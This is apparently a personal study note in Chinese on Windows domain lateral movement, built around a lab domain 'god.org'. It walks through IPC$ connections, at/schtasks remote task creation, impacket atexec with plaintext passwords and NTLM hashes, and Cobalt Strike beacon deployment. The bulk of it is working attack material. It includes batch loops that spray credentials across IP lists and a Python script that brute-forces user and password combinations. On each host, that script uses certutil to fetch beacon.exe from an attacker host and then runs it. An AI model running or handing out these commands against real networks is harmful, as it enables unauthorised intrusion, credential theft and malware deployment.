# 内网安全——横向移动IPC&atexec配合CS全自动拿域控

# IPC利用流程

1. IPC是专用管道，可以实现对远程计算机的访问，需要使用目标系统用户的账号密码，使用139、445端口。

   - 建立IPC链接到目标主机

   - 拷贝要执行的命令脚本到目标主机

     ``` powershell
     net use \\server\ipc$ "password" /user:username # 工作组
     
     net use \\server\ipc$ "password" /user:domain\username #域内
     ```

   - 查看目标时间，创建计划任务（at、schtasks）定时执行拷贝到的脚本

     ``` powershell
     dir \\xx.xx.xx.xx\C$\        # 查看文件列表
     
     copy \\xx.xx.xx.xx\C$\1.bat 1.bat # 下载文件
     
     copy 1.bat \\xx.xx.xx.xx\C$ # 复制文件
     
     net view xx.xx.xx.xx        # 查看对方共享
     ```

   - 删除IPC链接

     ``` powershell
     net use \\xx.xx.xx.xx\C$\1.bat /del # 删除IPC
     ```

2. 建立IPC常见的错误代码
   - 5：拒绝访问，可能是使用的用户不是管理员权限，需要先提升权限
   - 51：网络问题，Windows 无法找到网络路径
   - 53：找不到网络路径，可能是IP地址错误、目标未开机、目标Lanmanserver服务未启动、有防火墙等问题
   - 67：找不到网络名，本地Lanmanworkstation服务未启动，目标删除ipc$
   - 1219：提供的凭据和已存在的凭据集冲突，说明已建立IPC$，需要先删除
   - 1326：账号密码错误
   - 1792：目标NetLogon服务未启动，连接域控常常会出现此情况
   - 2242：用户密码过期，目标有账号策略，强制定期更改密码

3. 建立IPC失败的原因

   - 目标系统不是NT或以上的操作系统

   - 对方没有打开IPC$共享
   - 对方未开启139、445端口，或者被防火墙屏蔽
   - 输出命令、账号密码有错误

# ipc&at&schtask

![2](D:\笔记\web安全学习笔记\img\nwIPC\image2.png)

1. 提权(CS)：

   ``` powershell
   web->system administrator->system
   ```

2. 收集(网络&用户&密码)：

   ``` powershell
   Ladon Adfinder BloodHound
   ```

3. 横向(ipc)

   ``` powershell
   [at] & [schtasks]
   
   #at < Windows2012
   
   net use \\192.168.3.21\ipc$ "Admin12345" /user:god.org\ad
   
   ministrator # 建立ipc连接：
   
   copy beacon.exe \\192.168.3.21\c$ #拷贝执行文件到目标机器
   
   at \\192.168.3.21 15:47 c:\beacon.exe  #添加计划任务
   
   #schtasks >=Windows2012
   
   net use \\192.168.3.32\ipc$ "admin!@#45" /user:god.org\ad
   
   ministrator # 建立ipc连接：
   
   copy beacon.exe \\192.168.3.32\c$ #复制文件到其C盘
   
   schtasks /create /s 192.168.3.32 /ru "SYSTEM" /tn beacon /sc DAILY /tr c:\beacon.exe /F #创beacon任务对应执行文件
   
   schtasks /run /s 192.168.3.32 /tn beacon /i #运行beacon任务
   
   schtasks /delete /s 192.168.3.21 /tn beacon /f#删除beacon任务
   ```

4. 上线（正向）

   ``` powershell
   创建监听器->beacon_bind_tcp->beacon.exe
   connect 192.168.3.32 4444
   ```

5. ``` powershell
   FOR /F %%i in (ips.txt) do net use \\%%i\ipc$ "admin!@#45" /user:administrator
   
   FOR /F %%i in (ips.txt) do copy beacon.exe \\%%i\c$
   
   FOR /F %%i in (ips.txt) do schtasks /create /s %%i /ru "SYSTEM" /tn beacon /sc DAILY /tr c:\beacon.exe /F
   
   FOR /F %%i in (ips.txt) do schtasks /run /s %%i /tn beacon /i
   
   at \\192.168.3.21 06:45 c:\beacon.exe
   
   FOR /F %%i in (ips.txt) do net use \\%%i\ipc$ "admin!@#45" /user:administrator #批量检测IP对应明文连接
   
   FOR /F %%i in (ips.txt) do atexec.exe ./administrator:admin!@#45@%%i whoami #批量检测IP对应明文回显版
   
   FOR /F %%i in (pass.txt) do atexec.exe ./administrator:%%i@192.168.3.21 whoami #批量检测明文对应IP回显版
   
   FOR /F %%i in (hash.txt) do atexec.exe -hashes :%%i ./administrator@192.168.3.21 whoami #批量检测HASH对应IP回显版
   ```

# impacket-atexec

![1](D:\笔记\web安全学习笔记\img\NWIPC\image1.png)

1. [impacket-examples-windows](https://gitee.com/RichChigga/impacket-examples-windows)

2. 该工具是一个半交互的工具，适用于Webshell下，Socks代理下;

3. 在渗透利用中可以收集用户名、明文密码、密码hash、远程主机等做成字典，批量测试

4. CS本地用户明文连接：

   ``` powershell
   shell atexec.exe ./administrator:Admin12345@192.168.3.21 "whoami"
   ```

5. CS域内用户明文连接：

   ``` powershell
   shell atexec.exe god/administrator:Admin12345@192.168.3.21 "ver"
   ```

6. CS域内本地用户明文密文连接：

   ``` powershell
   atexec.exe -hashes :ccef208c6485269c20db2cad21734fe7 ./administrator@192.168.3.21 "whoami"
   
   atexec.exe -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@192.168.3.21 "whoami"
   ```

7. Py脚本-全自动化

   ``` powershell
   pyinstaller -F fuck_neiwang_001.py 生成可执行EXE
   ```

   ``` powershell
   import os,time
   
   ips={
   
       '192.168.3.21',
   
       '192.168.3.25',
   
       '192.168.3.29',
   
       '192.168.3.30',
   
       '192.168.3.32'
   
   }
   
   
   users={
   
       'Administrator',
   
       'boss',
   
       'dbadmin',
   
       'fileadmin',
   
       'jack',
   
       'mary',
   
       'vpnadm',
   
       'webadmin'
   
   }
   
   passs={
   
       'admin',
   
       'admin!@#45',
   
       'Admin12345'
   
   }
   
   
   
   def down():#下载后门
   
       for ip in ips:
   
           for user in users:
   
               for mima in passs:
   
                   #exec="net use \\"+ "\\"+ip+'\ipc$ '+mima+' /user:god\\'+user
   
                   exec1='atexec.exe ./administrator:'+mima+'@'+ip+' "certutil -urlcache -split -f http://192.168.3.31/beacon.exe c:/beacon.exe"'
   
                   exec2='atexec.exe god/'+user+':'+mima+'@'+ip+' "certutil -urlcache -split -f http://192.168.3.31/beacon.exe c:/beacon.exe"'
   
                   #exec3='atexec.exe ./administrator:admin!@#45@192.168.3.32 "certutil -urlcache -split -f http://192.168.3.31/beacon.exe c:/beacon.exe"'
   
                   print('--->'+exec1+'<---')
   
                   print('--->' + exec2 + '<---')
   
                   os.system(exec1)
   
                   os.system(exec2)
   
   
   def exec():#执行后门
   
       for ip in ips:
   
           for user in users:
   
               for mima in passs:
   
                   # exec="net use \\"+ "\\"+ip+'\ipc$ '+mima+' /user:god\\'+user
   
                   exec1 = 'atexec.exe ./administrator:' + mima + '@' + ip + ' "c:/beacon.exe"'
   
                   exec2 = 'atexec.exe god/' + user + ':' + mima + '@' + ip + ' "c:/beacon.exe"'
   
                   #exec3='atexec.exe ./administrator:admin!@#45@192.168.3.32 "certutil -urlcache -split -f http://192.168.3.31/beacon.exe c:/beacon.exe"'
   
                   print('--->' + exec1 + '<---')
   
                   print('--->' + exec2 + '<---')
   
                   os.system(exec1)
   
                   os.system(exec2)
   
   
   if __name__ == '__main__':
   
       down()
   
       exec()
   ```

